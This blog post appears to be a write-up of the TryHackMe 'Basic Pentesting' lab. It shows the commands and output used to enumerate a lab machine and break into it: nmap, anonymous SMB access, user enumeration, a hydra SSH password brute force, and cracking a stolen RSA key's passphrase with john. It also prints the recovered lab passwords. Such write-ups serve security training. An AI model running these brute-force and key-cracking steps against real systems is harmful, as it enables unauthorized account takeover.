---
title: Basic Pentesting THM
date: 2024-05-20 12:00:00 +0000
categories: [Blog, Tech]
tags: [notion, github]
layout: post
---

# nmap scan

- TCP Scan .

```bash
nmap -sV -sC 10.67.176.192
```

- TCP Scan Result .

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-01 19:53 EET
Nmap scan report for 10.67.176.192 (10.67.176.192)
Host is up (0.15s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 bd:4f:ce:b9:2f:ca:1e:80:d5:1a:75:03:67:19:42:6a (RSA)
|   256 88:1f:89:22:50:b3:7a:3f:0e:68:a0:f8:8d:8e:a5:16 (ECDSA)
|_  256 5b:bf:80:7a:02:24:bb:ff:2f:26:87:02:e1:07:79:df (ED25519)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http-proxy
| fingerprint-strings: 
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, OPTIONS
|     Content-Length: 0
|     Date: Sun, 01 Feb 2026 17:53:58 GMT
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.95%I=7%D=2/1%Time=697F9336%P=x86_64-pc-linux-gnu%r(HTT
SF:POptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow:\x20GET,\x20HEAD,\x20POST,\x
SF:20OPTIONS\r\nContent-Length:\x200\r\nDate:\x20Sun,\x2001\x20Feb\x202026
SF:\x2017:53:58\x20GMT\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2026-02-01T17:56:32
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 234.56 seconds

```

# Shares Enumeration

- smbmap enumeration .

```basic
smbmap -H 10.67.176.192         
```

- smbmap result .

```bash
[+] IP: 10.67.176.192:445       Name: 10.67.176.192             Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Anonymous                                               READ ONLY
        IPC$                                                    NO ACCESS       IPC Service (Samba Server 4.15.13-Ubuntu)
```

- access Anonymous using smbclient .

```bash
smbclient //10.67.176.192/Anonymous -N
```

- we found staff.txt but nothing interesting .

```bash
smb: \> ls
  .                                   D        0  Thu Apr 19 19:31:20 2018
  ..                                  D        0  Thu Apr 19 19:13:06 2018
  staff.txt                           N      173  Thu Apr 19 19:29:55 2018
```

# Directories

- gobuster .

```bash
gobuster dir -u http://10.67.176.192/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt 
```

- gobuster result .

```bash
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.67.176.192/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/development          (Status: 301) [Size: 320] [--> http://10.67.176.192/development/]

```

# Web

- opening web .

![Web Index](/assets/img/basic-pentesting/image.png)

- go to found directory `/development`notice there is directory listing .

![Development Directory](/assets/img/basic-pentesting/image-1.png)

- from `dev.txt`  .

```bash
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```

- from `j.txt` .

```bash
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```

# Getting initial Shell

- after using enum4linux .

```bash
enum4linux 10.67.176.192
```

- we found users.

```bash
 ==================( Users on 10.67.176.192 via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                                                                                            
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                                 
                                                                                                                                                                            
S-1-22-1-1000 Unix User\kay (Local User)                                                                                                                                    
S-1-22-1-1001 Unix User\jan (Local User)
S-1-22-1-1002 Unix User\ubuntu (Local User)
```

- now we brute force each user on ssh port .

```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.67.176.192 -f 
```

- we got password .

![Hydra Brute Force](/assets/img/basic-pentesting/image-2.png)

```bash
[22][ssh] host: 10.67.176.192   login: jan   password: armando
```

- now use it login using ssh with password .

```bash
ssh jan@10.67.176.192 
```

# Privilege escalation

- after getting jan shell we notice another user file kay .
- we find pass file but permission denied .

![Kay Directory Access](/assets/img/basic-pentesting/image-3.png)

- after searching we found rsa key for kay .

![RSA Key Found](/assets/img/basic-pentesting/image-4.png)

- we copy it and crack it using john .

```bash
┌──(abdelrhman㉿kali)-[/tmp/test]
└─$ nano rsa                                               
                                                                                                                                                                           
┌──(abdelrhman㉿kali)-[/tmp/test]
└─$ ssh2john rsa > rsa.hash  

                                                                                                                                                                           
┌──(abdelrhman㉿kali)-[/tmp/test]
└─$ john rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (rsa)     
1g 0:00:00:00 DONE (2026-02-02 05:25) 9.090g/s 752290p/s 752290c/s 752290C/s bird..bammer
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

- now login using key and pass .

```bash
└─$ chmod 600  rsa                                           
                                                                                                                                                                           
┌──(abdelrhman㉿kali)-[/tmp/test]
└─$ ssh -i rsa kay@10.66.164.153
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'rsa': 
```

- now open pass.bak .

```bash
kay@ip-10-66-164-153:~$ cat pass.bak
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```
